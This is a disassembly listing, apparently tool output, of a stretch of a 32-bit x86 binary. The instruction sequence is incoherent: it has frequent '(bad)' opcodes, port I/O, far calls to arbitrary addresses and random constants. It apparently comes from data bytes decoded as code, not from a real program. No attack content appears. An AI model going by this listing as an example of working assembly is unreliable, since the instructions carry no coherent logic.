  52d7b6:	fdiv   st(4),st
  52d7b8:	pop    ss
  52d7b9:	inc    ecx
  52d7ba:	test   al,0x90
  52d7bc:	into   
  52d7bd:	pop    esi
  52d7be:	dec    esi
  52d7bf:	scas   al,BYTE PTR es:[edi]
  52d7c0:	test   ebp,0xabc35566
  52d7c6:	stos   BYTE PTR es:[edi],al
  52d7c7:	mov    WORD PTR [ebx-0x607406],fs
  52d7cd:	test   DWORD PTR [esi-0x23],ebp
  52d7d0:	pop    ss
  52d7d1:	xchg   edi,eax
  52d7d2:	in     al,dx
  52d7d3:	sbb    DWORD PTR [esi+0x23],0xd31fc11e
  52d7da:	jl     0x52d76f
  52d7dc:	ins    BYTE PTR es:[edi],dx
  52d7dd:	loop   0x52d7f4
  52d7df:	ins    DWORD PTR es:[edi],dx
  52d7e0:	dec    esp
  52d7e1:	outs   dx,DWORD PTR ds:[esi]
  52d7e2:	pop    eax
  52d7e3:	cwde   
  52d7e4:	xor    BYTE PTR [ebp+0xce9b534],bl
  52d7ea:	out    dx,eax
  52d7eb:	jl     0x52d847
  52d7ed:	ret    0x4de5
  52d7f0:	mov    dh,0xca
  52d7f2:	sti    
  52d7f3:	adc    al,BYTE PTR [ebp-0x5d]
  52d7f6:	adc    al,0x26
  52d7f8:	mov    bh,0xee
  52d7fa:	add    BYTE PTR [edi+0x8a40db9],al
  52d800:	retf   0xf8db
  52d803:	cmp    BYTE PTR [ebx+0x265041f0],al
  52d809:	adc    BYTE PTR [edi+ebx*4],bl
  52d80c:	fsubr  DWORD PTR [ebp-0x6d28c1d7]
  52d812:	out    dx,al
  52d813:	add    al,0xcc
  52d815:	mov    edx,0xe083b69a
  52d81a:	mov    al,0x34
  52d81c:	stos   DWORD PTR es:[edi],eax
  52d81d:	ins    DWORD PTR es:[edi],dx
  52d81e:	call   0xf283:0x5a54
  52d824:	and    bh,BYTE PTR [edi+0x11]
  52d827:	pop    ebx
  52d828:	unpckhps xmm1,XMMWORD PTR [ecx+0x3a6c2f74]
  52d82f:	retf   
  52d830:	dec    edx
  52d831:	xchg   ebp,eax
  52d832:	rol    cl,cl
  52d834:	dec    DWORD PTR [edx+0x467cd489]
  52d83a:	std    
  52d83b:	push   ds
  52d83c:	and    bl,dl
  52d83e:	sub    BYTE PTR [edx],cl
  52d840:	mov    edx,0x4b6e6047
  52d845:	xor    al,BYTE PTR [edi-0x55]
  52d848:	(bad)  
  52d849:	out    dx,al
  52d84a:	mov    cl,0x6b
  52d84c:	jge    0x52d85e
  52d84e:	dec    ebp
  52d84f:	(bad)  
  52d850:	cwde   
  52d851:	out    0x3e,al
  52d853:	pusha  
  52d854:	dec    esi
  52d855:	push   eax
  52d856:	dec    ebx
  52d857:	adc    al,0xe
  52d859:	pop    edi
  52d85a:	es pushf 
  52d85c:	push   ss
  52d85d:	sbb    bl,dh
  52d85f:	jns    0x52d874
  52d861:	cmp    dh,BYTE PTR [ecx+0x3]
  52d864:	jo     0x52d7f3
  52d866:	scas   al,BYTE PTR es:[edi]
  52d867:	add    BYTE PTR [edx+0x68b448c3],ah
  52d86d:	nop
  52d86e:	jecxz  0x52d876
  52d870:	je     0x52d892
  52d872:	in     eax,0xba
  52d874:	loop   0x52d8bd
  52d876:	lea    edi,[ecx]
  52d878:	loope  0x52d870
  52d87a:	std    
  52d87b:	clc    
  52d87c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52d87e:	xchg   edx,eax
  52d87f:	push   ecx
  52d880:	daa    
  52d881:	jb     0x52d830
  52d883:	xor    eax,0x4685b8cb
  52d888:	mov    bl,0x98
  52d88a:	test   al,0x12
  52d88c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52d88d:	test   DWORD PTR [eax-0x2cc3478],0xd2c1dd8e
  52d897:	cld    
  52d898:	pop    edi
  52d899:	sub    dh,al
  52d89b:	stc    
  52d89c:	not    BYTE PTR [eax-0x2e46670e]
  52d8a2:	mov    ecx,0xf2eb1ed
  52d8a7:	jne    0x52d8c9
  52d8a9:	cld    
  52d8aa:	mov    dl,0xb2
  52d8ac:	mov    bl,0x60
  52d8ae:	xchg   ecx,eax
  52d8af:	add    dh,BYTE PTR [ecx+edx*1-0x7c9c9c51]
  52d8b6:	cwde   
  52d8b7:	jbe    0x52d843
  52d8b9:	inc    ebp
  52d8ba:	cdq    
  52d8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52d8bc:	sbb    DWORD PTR [ebp-0x73],eax
  52d8bf:	scas   al,BYTE PTR es:[edi]
  52d8c0:	retf   0xa141
  52d8c3:	aas    
  52d8c4:	icebp  
  52d8c5:	unpcklps xmm3,XMMWORD PTR ds:0x8210e2e6
  52d8cc:	fwait
  52d8cd:	jle    0x52d868
  52d8cf:	lods   eax,DWORD PTR ds:[esi]
  52d8d0:	test   al,0x5c
  52d8d2:	or     esp,esi
  52d8d4:	jge    0x52d893
  52d8d6:	loop   0x52d885
  52d8d8:	xchg   ecx,eax
  52d8d9:	data16 fistp WORD PTR [ebp-0x1dbe47a7]
  52d8e0:	pop    esp
  52d8e1:	dec    eax
  52d8e2:	test   BYTE PTR [edx+0x7e2aefd],dl
  52d8e8:	iret   
  52d8e9:	pop    ebp
  52d8ea:	clc    
  52d8eb:	xchg   edi,eax
  52d8ec:	pusha  
  52d8ed:	add    BYTE PTR [edx-0x51f35981],al
  52d8f3:	sub    al,0x8
  52d8f5:	call   0x6cb61357
  52d8fa:	push   edx
  52d8fb:	rcr    BYTE PTR [edi+0x19],cl
  52d8fe:	test   BYTE PTR [edx-0x36],ah
  52d901:	push   ds
  52d902:	cmp    dl,BYTE PTR [ebp+0x4dbba339]
  52d908:	fdiv   st,st(5)
  52d90a:	rcr    al,1
  52d90c:	imul   esp,DWORD PTR es:[ecx-0x3fd60630],0xcc30284a
  52d917:	call   0xeec89647
  52d91c:	push   eax
  52d91d:	sub    eax,0xdef45a4e
  52d922:	pop    esi
  52d923:	mov    eax,0x42e3de
  52d928:	sbb    ebx,DWORD PTR [ebx+0x7095c043]
  52d92e:	pop    esi
  52d92f:	add    DWORD PTR [esi],eax
  52d931:	and    eax,0x1d7f1e6f
  52d936:	lock imul ebx,DWORD PTR [esi+0x7cea05fe],0x84934be0
  52d941:	xor    BYTE PTR [edi+edx*1+0x14],ch
  52d945:	mov    edx,0xcb896323
  52d94a:	hlt    
  52d94b:	adc    al,0x31
  52d94d:	loop   0x52d8ef
  52d94f:	enter  0xb863,0x45
  52d953:	je     0x52d9cc
  52d955:	xor    BYTE PTR [eax],0xb2
  52d958:	test   BYTE PTR [edx+0x27ce65df],al
  52d95e:	mov    bh,0x95
  52d960:	sub    ebx,DWORD PTR [eax-0x4]
  52d963:	call   0xb755:0xa259786d
  52d96a:	push   esi
  52d96b:	or     ch,al
  52d96d:	or     edi,esp
  52d96f:	aas    
  52d970:	xor    edx,edi
  52d972:	test   BYTE PTR [edi+edi*1],bl
  52d975:	ss inc ebx
  52d977:	test   DWORD PTR [esi],edx
  52d979:	pusha  
  52d97a:	(bad)  
  52d97b:	fild   DWORD PTR [eax]
  52d97d:	pop    edi
  52d97e:	lods   al,BYTE PTR ds:[esi]
  52d97f:	push   edx
  52d980:	clc    
  52d981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52d982:	dec    ecx
  52d983:	das    
  52d984:	(bad)
  52d987:	fucomi st,st(0)
  52d989:	call   0xf355adc8
  52d98e:	out    dx,eax
  52d98f:	sub    edi,DWORD PTR [ecx+0x5c1685d3]
  52d995:	mov    ebp,0x65bbb53a
  52d99a:	in     al,0x15
  52d99c:	sub    DWORD PTR [eax+0x3c],ebx
  52d99f:	sub    DWORD PTR [ecx-0x1ea00ebc],edx
  52d9a5:	arpl   WORD PTR [edx-0x58],dx
  52d9a8:	lea    esi,[esi+0x1d53973c]
  52d9ae:	scas   al,BYTE PTR es:[edi]
  52d9af:	mov    dh,0x3b
  52d9b1:	dec    edi
  52d9b2:	mov    BYTE PTR [edi-0x22],bl
  52d9b5:	jbe    0x52d9b9
  52d9b7:	mov    edi,0xf2174da3
  52d9bc:	inc    eax
  52d9bd:	in     al,dx
  52d9be:	inc    ebp
  52d9c0:	adc    eax,0x5f6a889f
  52d9c5:	sbb    BYTE PTR ds:0xe726fb95,dh
  52d9cb:	jne    0x52d9da
  52d9cd:	sbb    DWORD PTR [ebx-0x2f],0xfffffff1
  52d9d1:	loopne 0x52d9b8
  52d9d3:	test   BYTE PTR [eax+0x32],ah
  52d9d6:	pop    ebx
  52d9d7:	int    0x62
  52d9d9:	div    DWORD PTR [edx-0x2f9bba86]
  52d9df:	aad    0xb3
  52d9e1:	cmp    BYTE PTR [esi],bh
  52d9e3:	shr    BYTE PTR [ecx+0x666bf49],1
  52d9e9:	sub    BYTE PTR [edx],0x63
  52d9ec:	mov    al,0x90
  52d9ee:	aaa    
  52d9ef:	icebp  
  52d9f0:	(bad)  
  52d9f2:	outs   dx,DWORD PTR ds:[esi]
  52d9f3:	jmp    0x2bfd0408
  52d9f8:	retf   0x83c3
  52d9fb:	add    esp,edi
  52d9fd:	pop    eax
  52d9fe:	jl     0x52da3b
  52da00:	ror    DWORD PTR ds:0xd6835549,cl
  52da06:	fldcw  WORD PTR [ebx+edx*1-0x63]
  52da0a:	mov    ch,0xa9
  52da0c:	mov    ?,edi
  52da0e:	inc    edx
  52da0f:	fist   WORD PTR fs:[ecx-0x56258533]
  52da16:	pop    ss
  52da17:	xchg   DWORD PTR [eax+0x45bf62e2],ebp
  52da1d:	sbb    BYTE PTR [ecx+ebx*2+0x77],0xa7
  52da22:	rcr    ecx,1
  52da24:	xchg   esp,eax
  52da25:	sbb    BYTE PTR [ecx+0x749df747],al
  52da2b:	(bad)  
  52da2c:	(bad)  
  52da2d:	xchg   esp,eax
  52da2e:	retf   0x5b9d
  52da31:	iret   
  52da32:	pusha  
  52da33:	mov    ebp,DWORD PTR [eax+0x41]
  52da36:	std    
  52da37:	sbb    BYTE PTR [eax+0x12],0x74
  52da3b:	jo     0x52da33
  52da3d:	call   0xb0c5030e
  52da42:	adc    edx,DWORD PTR [ebp+0x3592f15]
  52da48:	cmp    DWORD PTR [esi],ebx
  52da4a:	clc    
  52da4b:	repz sbb DWORD PTR [eax+0x6b2ecc15],esi
  52da52:	or     DWORD PTR [ebx+0x4ba962f2],edx
  52da58:	push   0x16
  52da5a:	inc    ebx
  52da5b:	call   0x7b36:0xcbba0116
  52da62:	stos   BYTE PTR es:[edi],al
  52da63:	pop    edx
  52da64:	stos   BYTE PTR es:[edi],al
  52da65:	jmp    0x7aa78e8e
  52da6a:	imul   eax,DWORD PTR [edi],0xffffffec
  52da6d:	or     eax,DWORD PTR [edi+0x1af61440]
  52da73:	stos   BYTE PTR es:[edi],al
  52da74:	fs and eax,0xa51c766c
  52da7a:	sbb    edi,DWORD PTR [eax+0x2c75ca7e]
  52da80:	mov    ch,0xb2
  52da82:	mov    esp,DWORD PTR [edx+ecx*8-0x5e4583e8]
  52da89:	(bad)  
  52da8a:	jp     0x52da1c
  52da8c:	mov    WORD PTR [edx],es
  52da8e:	mov    ecx,0x9924e811
  52da93:	push   es
  52da94:	push   esp
  52da95:	push   eax
  52da96:	montmul (bad)
  52da97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52da98:	rcl    DWORD PTR [esi+ebx*8],0x4f
  52da9c:	and    eax,0xddb0f3d4
  52daa1:	mov    ecx,0x57c9291c
  52daa6:	sub    al,ch
  52daa8:	(bad)  
  52daa9:	cdq    
  52daaa:	shl    DWORD PTR [ebx-0x54],0x5e
  52daae:	push   0x90659843
  52dab3:	jbe    0x52dac3
  52dab5:	lds    edi,FWORD PTR [esp+esi*8-0x4b]
  52dab9:	xor    al,0xe9
  52dabb:	sbb    al,BYTE PTR [esi-0x3d85dd01]
  52dac1:	xchg   edi,eax
  52dac2:	mov    eax,0x464f67ef
  52dac7:	add    eax,0x11e4c845
  52dacc:	lahf   
  52dacd:	jne    0x52daa4
  52dacf:	out    0xc9,al
  52dad1:	xor    DWORD PTR [ebp+0x195f027f],0x7b
  52dad8:	(bad)  
  52dad9:	cmovnp ecx,DWORD PTR [eax]
  52dadc:	xor    edx,DWORD PTR [edi+eiz*4-0x27687b89]
  52dae3:	mov    ebp,gs
  52dae5:	in     al,0xd
  52dae7:	adc    ebp,0xfffffffd
  52daea:	inc    esp
  52daeb:	pop    esi
  52daec:	jae    0x52daa4
  52daee:	cmp    edx,eax
  52daf0:	push   ebp
  52daf1:	pop    eax
  52daf2:	or     DWORD PTR [bx+di],esi
  52daf5:	cmp    ebx,DWORD PTR [ebx+eax*1-0x2954218e]
  52dafc:	and    DWORD PTR [eax],0x2cc62c61
  52db02:	call   0xae5feda4
  52db07:	xchg   edx,eax
  52db08:	push   bx
  52db0a:	inc    ecx
  52db0b:	je     0x52db2d
  52db0d:	repz inc ecx
  52db0f:	repz mov al,0x71
  52db12:	sub    BYTE PTR [eax-0x6],dl
  52db15:	xor    DWORD PTR [esi+0x27],edx
  52db18:	sub    dh,dl
  52db1a:	sbb    BYTE PTR [ebx],ah
  52db1c:	add    BYTE PTR ds:0x21c78dfb,dl
  52db22:	xor    al,0x65
  52db24:	mov    dh,0x83
  52db26:	pop    ecx
  52db27:	cmp    al,0x0
  52db29:	dec    eax
  52db2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52db2c:	stos   DWORD PTR es:[edi],eax
  52db2d:	push   edi
  52db2e:	and    cl,BYTE PTR [esi+0x52c0bca8]
  52db34:	mov    eax,ds:0xd6fd975f
  52db39:	pop    ebp
  52db3a:	and    eax,0xc68b38c4
  52db3f:	dec    ebx
  52db40:	mov    BYTE PTR [edx+0x3d],ch
  52db43:	shl    BYTE PTR [eax-0x4a1330cd],0x6a
  52db4a:	xor    esp,DWORD PTR [ebx+0x3c]
  52db4d:	and    ah,BYTE PTR ds:0xba3360ec
  52db53:	ins    DWORD PTR es:[edi],dx
  52db54:	fild   DWORD PTR [edx]
  52db56:	das    
  52db57:	ins    DWORD PTR es:[edi],dx
  52db58:	les    edi,FWORD PTR [esi-0x5873236b]
  52db5e:	mov    ecx,0xbb6514b6
  52db63:	cmp    BYTE PTR [eax+edx*8-0x4ecf14e6],bh
  52db6a:	pop    ebx
  52db6b:	push   0x27
  52db6d:	(bad)  
  52db6e:	push   0x82b572e8
  52db73:	stos   BYTE PTR es:[edi],al
  52db74:	jnp    0x52db95
  52db76:	in     al,dx
  52db77:	mov    ebp,0x16af4e9b
  52db7c:	add    BYTE PTR [edi],0x41
  52db7f:	xlat   BYTE PTR ds:[ebx]
  52db80:	inc    ebx
  52db81:	dec    edx
  52db82:	pop    es
  52db83:	inc    edi
  52db84:	fcmovnbe st,st(4)
  52db86:	outs   dx,DWORD PTR ds:[esi]
  52db87:	pop    es
  52db88:	mov    eax,0x346e72cf
  52db8d:	jnp    0x52db1e
  52db8f:	add    esp,DWORD PTR [edx]
  52db91:	pusha  
  52db92:	out    dx,eax
  52db93:	into   
  52db94:	dec    edi
  52db95:	sub    eax,0x20337de1
  52db9a:	adc    DWORD PTR [eax],edi
  52db9c:	sub    BYTE PTR [ecx],bl
  52db9e:	pop    edi
  52db9f:	sub    ebp,DWORD PTR [eax-0x16044ab4]
  52dba5:	mov    bl,0x15
  52dba7:	push   esp
  52dba8:	add    eax,0xcf9a3755
  52dbad:	or     edi,DWORD PTR [edi-0x60a3f97c]
  52dbb3:	in     eax,dx
  52dbb4:	loop   0x52db3e
  52dbb6:	or     DWORD PTR [ebp-0x2],0xffffffc5
  52dbba:	xor    eax,0xcaf0b6d8
  52dbbf:	mov    dh,0x76
  52dbc1:	push   ecx
  52dbc2:	loope  0x52db64
  52dbc4:	sar    BYTE PTR [edx],0x96
  52dbc7:	lock jnp 0x52dba4
  52dbca:	scas   eax,DWORD PTR es:[edi]
  52dbcb:	test   ebx,edx
  52dbcd:	and    eax,0x782a6c46
  52dbd2:	adc    BYTE PTR [ebx],0xc8
  52dbd5:	or     BYTE PTR [ebp-0x5e],0xc
  52dbd9:	mov    eax,0xecd82b8a
  52dbde:	imul   DWORD PTR [edx+0x69]
  52dbe1:	into   
  52dbe2:	stos   BYTE PTR es:[edi],al
  52dbe3:	lds    esp,FWORD PTR ds:0xeb9e7d9c
  52dbe9:	dec    ebp
  52dbea:	mov    WORD PTR [esi],gs
  52dbec:	add    eax,0xba12309b
  52dbf1:	repnz leave 
  52dbf3:	or     BYTE PTR [eax+0x3f],0x1c
  52dbf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52dbf8:	xor    cl,BYTE PTR [ecx-0x2fa5acee]
  52dbfe:	mov    ch,0x36
  52dc00:	stos   DWORD PTR es:[edi],eax
  52dc01:	clc    
  52dc02:	and    esp,eax
  52dc04:	pop    ebx
  52dc05:	mov    ecx,0xc08a4be7
  52dc0a:	fiadd  DWORD PTR [ebp+0x40]
  52dc0d:	outs   dx,DWORD PTR ds:[esi]
  52dc0e:	test   al,0x1c
  52dc10:	sbb    al,0x19
  52dc12:	xchg   bp,ax
  52dc14:	(bad)  
  52dc15:	jmp    0x52dc6e
  52dc17:	rcl    esp,cl
  52dc19:	adc    edx,edi
  52dc1b:	jo     0x52dc6e
  52dc1d:	cmp    dl,cl
  52dc1f:	pop    ebp
  52dc20:	ret    0xea60
  52dc23:	ins    BYTE PTR es:[edi],dx
  52dc24:	sub    ecx,DWORD PTR [edi-0x3c165961]
  52dc2a:	repnz outs dx,DWORD PTR ds:[esi]
  52dc2c:	das    
  52dc2d:	push   es
  52dc2e:	and    edx,eax
  52dc30:	(bad)  
  52dc31:	not    DWORD PTR [ebp-0x633e3f33]
  52dc37:	ror    edi,cl
  52dc39:	xchg   cl,dh
  52dc3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52dc3c:	or     BYTE PTR [ebp+0x3c30af22],bl
  52dc42:	mov    DWORD PTR [ebp-0x67],ebp
  52dc45:	xlat   BYTE PTR ds:[ebx]
  52dc46:	mov    bl,0x8b
  52dc48:	inc    edx
  52dc49:	out    0x86,al
  52dc4b:	repz xlat BYTE PTR ds:[ebx]
  52dc4d:	xor    eax,0xa163e43d
  52dc52:	xor    eax,DWORD PTR [ebp+ebp*4-0x5b3dff95]
  52dc59:	mov    bh,0x75
  52dc5b:	push   esp
  52dc5c:	push   ebx
  52dc5d:	push   0x92e2880f
  52dc62:	fisubr DWORD PTR [eax]
  52dc64:	pop    ecx
  52dc65:	ins    BYTE PTR es:[edi],dx
  52dc66:	dec    edi
  52dc67:	nop
  52dc68:	pop    esp
  52dc69:	mov    ss,WORD PTR [ecx]
  52dc6b:	sbb    BYTE PTR [edx],dl
  52dc6d:	sbb    DWORD PTR [ecx-0x1288efaf],0x1c578598
  52dc77:	mov    BYTE PTR [edx],ah
  52dc79:	xor    eax,0x8e190208
  52dc7e:	je     0x52dca7
  52dc80:	jge    0x52dc97
  52dc82:	iret   
  52dc83:	outs   dx,BYTE PTR ds:[esi]
  52dc84:	(bad)  [ecx+ecx*4-0x76c9539b]
  52dc8b:	sti    
  52dc8c:	mov    ds:0x473e40f2,al
  52dc91:	std    
  52dc92:	mov    ch,BYTE PTR ds:0xdf04c6e
  52dc98:	xchg   ebp,eax
  52dc99:	mov    ch,0x59
  52dc9b:	mov    eax,ds:0x78db7f72
  52dca0:	inc    ecx
  52dca1:	inc    ecx
  52dca2:	loope  0x52dc7f
  52dca4:	and    al,0x2e
  52dca6:	cmp    al,0xf9
  52dca8:	cmp    BYTE PTR [esi*4+0x23487f8c],cl
  52dcaf:	pop    esp
  52dcb0:	cdq    
  52dcb1:	and    ch,dl
  52dcb3:	aad    0x26
  52dcb5:	dec    ebp
  52dcb6:	sub    BYTE PTR [edx+0x6d2394c1],0x8f
  52dcbd:	jb     0x52dd01
  52dcbf:	daa    
  52dcc0:	mov    ds:0x195508d,al
  52dcc5:	xchg   esi,edi
  52dcc7:	imul   edi,DWORD PTR [ebp-0xe2c4c56],0x14
  52dcce:	outs   dx,DWORD PTR ds:[esi]
  52dccf:	mov    WORD PTR [edi],ds
  52dcd1:	nop
  52dcd2:	adc    al,0xae
  52dcd4:	out    0xcb,eax
  52dcd6:	or     dh,BYTE PTR [ecx-0x6ed8dc21]
  52dcdc:	outs   dx,BYTE PTR ds:[esi]
  52dcdd:	and    eax,0xf592258d
  52dce2:	in     al,dx
  52dce3:	sub    eax,0x5cf5c5c4
  52dce8:	popa   
  52dce9:	scas   eax,DWORD PTR es:[edi]
  52dcea:	int    0x37
  52dcec:	aad    0x72
  52dcee:	push   esi
  52dcef:	repz xor dl,BYTE PTR [eax+0x5d]
  52dcf3:	rcr    BYTE PTR [eax+0x7e],1
  52dcf6:	push   esp
  52dcf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52dcf8:	xchg   ebp,eax
  52dcf9:	enter  0xd93b,0x3
  52dcfd:	jbe    0x52dcbd
  52dcff:	dec    edx
  52dd00:	out    0xe1,al
  52dd02:	fnsave [eax]
  52dd04:	bound  edi,QWORD PTR [eax]
  52dd06:	or     bh,dl
  52dd08:	mov    esi,0x8b4183ad
  52dd0d:	aaa    
  52dd0e:	inc    eax
  52dd0f:	sbb    cl,bl
  52dd11:	pop    esp
  52dd12:	mov    edx,0x8b61a2e1
  52dd17:	pop    es
  52dd18:	imul   ebx,DWORD PTR [ebx+0x620b2751],0x8f45ea8d
  52dd22:	sub    edx,DWORD PTR [eax-0x79]
  52dd25:	bnd jns 0x52dd92
  52dd28:	stos   DWORD PTR es:[edi],eax
  52dd29:	rol    DWORD PTR [ecx+0x1b804114],1
  52dd2f:	iret   
  52dd30:	push   DWORD PTR [edi+0x52]
  52dd33:	retf   
  52dd34:	cwde   
  52dd35:	aad    0x4b
  52dd37:	daa    
  52dd38:	sbb    ebx,esi
  52dd3a:	imul   eax,DWORD PTR [ecx],0x25
  52dd3d:	push   ds
  52dd3e:	cdq    
  52dd3f:	dec    esp
  52dd40:	pop    edi
  52dd41:	add    ebx,DWORD PTR [ebx+ebp*4+0x6888e5e2]
  52dd48:	imul   esi,DWORD PTR [edi],0x9ae18316
  52dd4e:	jecxz  0x52ddbd
  52dd50:	ins    BYTE PTR es:[edi],dx
  52dd51:	rep stos DWORD PTR es:[edi],eax
  52dd53:	jg     0x52dd20
  52dd55:	jb     0x52ddc4
  52dd57:	cmp    eax,0x5b7960a3
  52dd5c:	sahf   
  52dd5d:	adc    edx,0xee91d38f
  52dd63:	push   ecx
  52dd64:	jmp    0x1de3cc3e
  52dd69:	lods   al,BYTE PTR ds:[esi]
  52dd6a:	ins    BYTE PTR es:[edi],dx
  52dd6b:	push   0x74
  52dd6d:	pop    ebp
  52dd6e:	mov    DWORD PTR [eax+0x56],ebp
  52dd71:	mov    esp,0xf24d72c5
  52dd76:	shr    DWORD PTR [ebp-0x63f52ae7],cl
  52dd7c:	aas    
  52dd7d:	pop    edx
  52dd7e:	pushf  
  52dd7f:	je     0x52dda1
  52dd81:	dec    ecx
  52dd82:	cmp    BYTE PTR [edi-0x1be21fa6],ah
  52dd88:	shl    DWORD PTR [eax-0x79],cl
  52dd8b:	test   al,0x33
  52dd8d:	xchg   ecx,esi
  52dd8f:	outs   dx,DWORD PTR ds:[esi]
  52dd90:	or     bl,BYTE PTR [ebp+0x20f55e42]
  52dd96:	ds test al,0x11
  52dd99:	dec    esi
  52dd9a:	mov    edi,0x11429a53
  52dd9f:	popa   
  52dda0:	jmp    0x6e81d642
  52dda5:	fmul   DWORD PTR [esi-0x26a00a91]
  52ddab:	jno    0x52dd5c
  52ddad:	dec    esi
  52ddae:	or     ecx,eax
  52ddb0:	sbb    BYTE PTR [edi],0x59
  52ddb3:	pop    eax
  52ddb4:	push   0x2e992ed9
  52ddb9:	dec    ebp
  52ddba:	xchg   edx,eax
  52ddbb:	pop    ds
  52ddbc:	mov    eax,ds:0x373739a9
  52ddc1:	adc    BYTE PTR [edx],cl
  52ddc3:	aas    
  52ddc4:	inc    ebp
  52ddc5:	test   eax,0xf4281ee6
  52ddca:	push   ss
  52ddcb:	stos   DWORD PTR es:[edi],eax
  52ddcc:	jno    0x52de1f
  52ddce:	mov    WORD PTR [ebp-0x713b25ed],cs
  52ddd4:	icebp  
  52ddd5:	mov    bl,0x2d
  52ddd7:	test   BYTE PTR [esi-0x3a5bcfb1],ah
  52dddd:	es push ebx
  52dddf:	inc    ecx
  52dde0:	dec    ebp
  52dde1:	fsub   DWORD PTR [edi-0x6f]
  52dde4:	and    DWORD PTR [ebp-0x1b6dec83],0xffffffe5
  52ddeb:	adc    BYTE PTR [edx+0x4a],ch
  52ddee:	jo     0x52de36
  52ddf0:	out    0xd4,al
  52ddf2:	jp     0x52de1c
  52ddf4:	fistp  QWORD PTR [ebp-0x2e]
  52ddf7:	push   ds
  52ddf8:	test   dl,ch
  52ddfa:	pop    edi
  52ddfb:	out    dx,al
  52ddfc:	pop    ecx
  52ddfd:	fadd   QWORD PTR [ebx]
  52ddff:	ficom  DWORD PTR [edi]
  52de01:	repnz test al,0xb2
  52de04:	retf   
  52de05:	test   DWORD PTR [esi+0x60a5b070],ebp
  52de0b:	mov    esi,0xb50690ee
  52de10:	jle    0x52de77
  52de12:	mov    dl,0xb6
  52de14:	std    
  52de15:	mov    ah,0xf5
  52de17:	dec    edx
  52de18:	(bad)  ds:0x3d693ace
  52de1e:	pop    esp
  52de1f:	and    ecx,DWORD PTR [ebx+0x7d]
  52de22:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  52de24:	pop    es
  52de25:	cmp    BYTE PTR [ebx],ch
  52de27:	xchg   ebx,edi
  52de29:	jmp    0x52ddc3
  52de2b:	int    0xde
  52de2d:	sub    dh,BYTE PTR [ecx+0x2d]
  52de30:	pop    eax
  52de31:	pop    edx
  52de32:	cld    
  52de33:	mov    ecx,0x244971f0
  52de38:	clc    
  52de39:	daa    
  52de3a:	mov    ebx,DWORD PTR [ecx+0x392a28f6]
  52de40:	das    
  52de41:	cmp    BYTE PTR [edi+0xb629e51],0x2c
  52de48:	mov    ds:0x7b20b60,al
  52de4d:	jns    0x52de29
  52de4f:	xchg   ebx,eax
  52de50:	pop    DWORD PTR [ebx+eax*4+0xecd8d87]
  52de57:	loope  0x52deaa
  52de59:	data16 lods al,BYTE PTR ds:[esi]
  52de5b:	clc    
  52de5c:	out    0x97,al
  52de5e:	gs push ebx
  52de60:	or     BYTE PTR [eax+ebx*4-0x60],0x3d
  52de65:	cs sub bl,ch
  52de68:	rcr    al,0xb8
  52de6b:	in     al,0x71
  52de6d:	dec    eax
  52de6e:	loopne 0x52de56
  52de70:	outs   dx,BYTE PTR ds:[esi]
  52de71:	sub    edi,DWORD PTR [edx+0x56b7a3d7]
  52de77:	and    ah,al
  52de79:	outs   dx,DWORD PTR ds:[esi]
  52de7a:	loop   0x52de84
  52de7c:	add    eax,DWORD PTR [ebx]
  52de7e:	xor    eax,0xe0b33a79
  52de83:	xchg   BYTE PTR [ebp+0x55],dh
  52de86:	aas    
  52de87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52de88:	pop    esp
  52de89:	clc    
  52de8a:	aad    0xc5
  52de8c:	mov    ds:0xb0461ea5,al
  52de91:	retf   0xb2e7
  52de94:	inc    eax
  52de95:	iret   
  52de96:	loop   0x52dec3
  52de98:	fisubr WORD PTR [ebx]
  52de9a:	sbb    eax,0xa7e4fab4
  52de9f:	ret    
  52dea0:	adc    al,BYTE PTR [ecx]
  52dea2:	shl    BYTE PTR [esi+0x164de14c],0xf5
  52dea9:	and    dh,BYTE PTR [ebp+ebx*2-0x7b]
  52dead:	icebp  
  52deae:	loopne 0x52df0f
  52deb0:	cli    
  52deb1:	inc    eax
  52deb2:	or     ecx,DWORD PTR [esi+0x7bceeaf8]
  52deb8:	push   0xffffffcc
  52deba:	add    bl,BYTE PTR [ebx]
  52debc:	push   esi
  52debd:	in     eax,dx
  52debe:	mov    edx,0xa4d418dd
  52dec3:	mov    eax,ds:0xce2c2223
  52dec8:	in     al,dx
  52dec9:	out    dx,al
  52deca:	out    0x1,al
  52decc:	arpl   WORD PTR [esi+0x65ebfe65],bp
  52ded2:	gs jge 0x52decc
  52ded5:	stos   DWORD PTR es:[edi],eax
  52ded6:	sbb    DWORD PTR [ebx+0xb],esp
  52ded9:	mov    edx,0xf9ba68e
  52dede:	mov    ebx,0xbdeea3ec
  52dee3:	ins    BYTE PTR es:[edi],dx
  52dee4:	add    BYTE PTR [edx],ch
  52dee6:	mov    dh,0x43
  52dee8:	mov    eax,0x388ed014
  52deed:	add    bl,BYTE PTR [esi+0x12]
  52def0:	xchg   edi,eax
  52def1:	retf   
  52def2:	xchg   ebp,eax
  52def3:	xchg   edi,eax
  52def4:	inc    ebx
  52def5:	lods   al,BYTE PTR ds:[esi]
  52def6:	jg     0x52de8f
  52def8:	jmp    0x82384a7a
  52defd:	xchg   ebx,eax
  52defe:	xchg   ebp,eax
  52deff:	jbe    0x52df16
  52df01:	cmp    BYTE PTR [eax-0x3be8945a],bh
  52df07:	inc    ebx
  52df08:	pushf  
  52df09:	xchg   BYTE PTR [esi+0x36],cl
  52df0c:	nop
  52df0d:	xchg   edx,eax
  52df0e:	jnp    0x52dec5
  52df10:	cmp    al,0x53
  52df12:	cs into 
  52df14:	add    al,0xf4
  52df16:	fwait
  52df17:	cwde   
  52df18:	addr16 inc edi
  52df1a:	es loope 0x52df23
  52df1d:	pop    ebx
  52df1e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  52df20:	stc    
  52df21:	repnz call 0x2619:0x6d04efd5
  52df29:	mov    WORD PTR [eax-0x25],ds
  52df2c:	or     eax,DWORD PTR [ecx]
  52df2e:	into   
